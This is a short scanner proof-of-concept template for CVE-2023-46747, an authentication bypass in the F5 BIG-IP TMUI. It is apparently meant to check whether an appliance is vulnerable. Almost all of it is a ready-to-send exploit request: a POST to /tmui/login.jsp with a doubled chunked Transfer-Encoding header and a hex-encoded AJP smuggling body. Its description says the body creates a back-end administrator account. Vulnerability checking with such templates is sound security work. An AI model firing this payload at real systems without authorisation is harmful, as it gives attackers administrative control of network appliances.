[info]
author = "ave"
description = "验证目标 F5 BIG-IP 是否存在 AJP Smuggling 导致的认证绕过漏洞 (CVE-2023-46747)。发送特制的分块编码请求到 /tmui/login.jsp，利用 AJP 协议走私创建后台管理员账户。成功则返回 200 且包含 expected 状态码，表明存在漏洞。"
id = "POC-AVE-2023-0002"
name = "F5 BIG-IP TMUI AJP Smuggling Authentication Bypass PoC"
severity = "critical"
tags = ["ave-2023-0002"]
vuln_id = [
    "CVE-2023-46747",
    "AVE-2023-0002",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/tmui/login.jsp"
protocol = "http"

[poc.requests.body]
content = """
204
{{ hex_decode(concat("","41414545","266e616d655f6265666f72653d267061737377643d","4141414141414141414141","267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff00")) }}
0"""
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
Transfer-Encoding = "chunked, chunked"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
